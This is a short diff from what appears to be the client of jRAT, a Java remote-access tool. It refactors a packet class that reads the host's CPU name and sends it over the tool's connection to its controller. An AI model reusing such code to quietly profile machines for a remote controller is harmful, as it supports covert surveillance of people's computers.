@@ -1,17 +1,17 @@
 package jrat.client.packets.outgoing;
 
-import jrat.common.io.StringWriter;
-import java.io.DataOutputStream;
-import java.io.File;
-import java.util.List;
+import jrat.client.Connection;
 import oslib.OperatingSystem;
 import oslib.Utils;
+
+import java.io.File;
+import java.util.List;
 
 
 public class Packet19InitCPU extends AbstractOutgoingPacket {
 
 	@Override
-	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
+	public void write(Connection con) throws Exception {
 		String cpu = "Unknown";
 		
 		try {
@@ -34,8 +34,8 @@ public class Packet19InitCPU extends AbstractOutgoingPacket {
 		} catch (Exception e) {
 			e.printStackTrace();
 		}
-		
-		sw.writeLine(cpu);
+
+        con.writeLine(cpu);
 	}
 
 	@Override
